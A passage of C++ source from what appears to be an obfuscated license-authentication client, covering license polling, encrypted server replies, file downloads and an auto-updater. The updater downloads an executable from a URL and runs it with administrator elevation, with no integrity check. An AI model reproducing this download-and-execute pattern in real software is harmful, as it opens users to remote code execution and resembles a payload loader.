    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return AuthGuards("ERROR|Unable to connect to server.").decrypt();
    }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, AuthGuards("GET").decrypt(), pathAndQuery.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return AuthGuards("ERROR|Unable to create HTTP request.").decrypt();
    }
    HttpAddRequestHeadersA(hRequest, customHeaders.c_str(), customHeaders.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return AuthGuards("ERROR|Unable to send HTTP request.").decrypt();
    }    
    std::string EResponse;
    char buffer[1024];
    DWORD bytesRead = 0;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);    
    if (EResponse.empty()) { return AuthGuards("ERROR|No response received.").decrypt(); }
    while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }    
    std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
    if (response.empty()) { exit(1); }
    if (response.length() < 2) { return AuthGuards("ERROR|Invalid response format.").decrypt(); }    
    return response;
}
void Api::backgroundchecker(const std::string& licenseKey) {
    std::thread([](std::string key) {
        for (;;) {
            std::string response = SLC(AG(AuthGuards("CBG").decrypt()), key);
            if (response.rfind(AuthGuards("ERROR|No response received.").decrypt(), 0) == 0) {
                Sleep(7000);
                continue;
            }
            if (response.rfind(AuthGuards("OK|").decrypt(), 0) != 0) {
                size_t noncePos = response.find(AuthGuards("|nonce=").decrypt());
                std::cout << "\n" << (noncePos != std::string::npos ? response.substr(0, noncePos) : response) << std::endl;
                Sleep(2000);
                ExitProcess(1);
            }
            Sleep(7000);
        }
    }, licenseKey).detach();
}

void Api::check(const std::string& licenseKey) {
    std::string response = SLC(AG(AuthGuards("CLIC").decrypt()), licenseKey);
    if (response.rfind(AuthGuards("OK|").decrypt(), 0) != 0) {
        size_t noncePos = response.find(AuthGuards("|nonce=").decrypt());
        std::cout << "\n" << (noncePos != std::string::npos ? response.substr(0, noncePos) : response) << std::endl;
        Sleep(2000);
        ExitProcess(1);
    }
}
std::vector<unsigned char> AUTH::Api::download(const std::string& fileId) {
    std::vector<unsigned char> result;
    if (fileId.empty()) { return result; }
    if (AUTH::Api::lastLicenseKey.empty()) { return result; }
    std::string url = AUTH::API_URL + AuthGuards("?ag=download&PID=").decrypt() + NovACorE::ARE(AUTH::PROJECT_ID) + AuthGuards("&file_id=").decrypt() + NovACorE::ARE(fileId) + AuthGuards("&key=").decrypt() + NovACorE::ARE(AUTH::Api::lastLicenseKey);
    HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuardsDownload").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { return result; }
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return result;
    }
    std::vector<unsigned char> buffer;
    buffer.reserve(4096);
    char temp[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hConnect, temp, sizeof(temp), &bytesRead) && bytesRead > 0) { buffer.insert(buffer.end(), temp, temp + bytesRead); }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    if (buffer.empty()) { return result; }
    std::string preview(reinterpret_cast<const char*>(buffer.data()), std::min<size_t>(buffer.size(), 256));
    bool hasControlChars = std::any_of(preview.begin(), preview.end(), [](unsigned char c) { return c < 0x09 || (c > 0x0D && c < 0x20);
    });

    if (!preview.empty() && !hasControlChars) {
        if (preview.rfind(AG(AuthGuards("ERROR|").decrypt()), 0) == 0 || 
            preview.rfind(AG(AuthGuards("BANNED").decrypt()), 0) == 0 || 
            preview.rfind(AG(AuthGuards("NOT_FOUND").decrypt()), 0) == 0 || 
            preview.rfind(AG(AuthGuards("EXPIRED").decrypt()), 0) == 0) {
            return result;
        }
        
        bool LLB64 = true;
        const std::string base64_chars = AuthGuards("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=").decrypt();
        for (char c : preview) {
            if (c != ' ' && c != '\r' && c != '\n' && c != '\t' && base64_chars.find(c) == std::string::npos) {
                LLB64 = false;
                break;
            }
        }
        
        if (LLB64 && buffer.size() < 10240) {
            std::string ED(reinterpret_cast<const char*>(buffer.data()), buffer.size());
            while (!ED.empty() && (ED.back() == '\r' || ED.back() == '\n' || ED.back() == ' ' || ED.back() == '\t')) { ED.pop_back(); }
            std::string decrypted = aesDecrypt(ED, AUTH::SECRET_CON);
            if (!decrypted.empty()) {
                if (decrypted.rfind(AG(AuthGuards("ERROR|").decrypt()), 0) == 0 || 
                    decrypted.rfind(AG(AuthGuards("BANNED").decrypt()), 0) == 0 || 
                    decrypted.rfind(AG(AuthGuards("NOT_FOUND").decrypt()), 0) == 0 || 
                    decrypted.rfind(AG(AuthGuards("EXPIRED").decrypt()), 0) == 0 ||
                    decrypted.rfind(AG(AuthGuards("FILE_ACCESS_DENIED").decrypt()), 0) == 0 ||
                    decrypted.rfind(AG(AuthGuards("FILE_NOT_FOUND").decrypt()), 0) == 0 ||
                    decrypted.rfind(AG(AuthGuards("FILE_DOWNLOAD_FAILED").decrypt()), 0) == 0) {
                    return result;
                }
            }
        }
    }
    result.swap(buffer);
    return result;
}

    bool AUTH::Api::downloadAndInstallUpdate(const std::string& updateUrl) {
        if (updateUrl.empty()) { return false; }
    std::cout << AG(AuthGuards("Downloading update...").decrypt()) << std::endl;
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::string exePathStr(exePath);
        size_t lastBackslash = exePathStr.find_last_of("\\");
        std::string exeDir = (lastBackslash != std::string::npos) ? exePathStr.substr(0, lastBackslash + 1) : "";
    std::string filename = AG(AuthGuards("update.exe").decrypt());
    size_t lastSlash = updateUrl.find_last_of(AG(AuthGuards("/\\").decrypt()));
        if (lastSlash != std::string::npos && lastSlash < updateUrl.length() - 1) {
            filename = updateUrl.substr(lastSlash + 1);
            size_t questionMark = filename.find('?');
            if (questionMark != std::string::npos) { filename = filename.substr(0, questionMark); }
        }
        std::string downloadPath = exeDir + filename;
        HRESULT result = URLDownloadToFileA(NULL, updateUrl.c_str(), downloadPath.c_str(), 0, NULL);
        if (result != S_OK) { return false; }
    std::cout << AG(AuthGuards("Download completed. Launching update...").decrypt()) << std::endl;
    if (ShellExecuteA(NULL, AG(AuthGuards("runas").decrypt()).c_str(), downloadPath.c_str(), NULL, NULL, SW_SHOWNORMAL) > (HINSTANCE)32) {
            Sleep(2000);
            return true;
        }
        return false;
    }
}
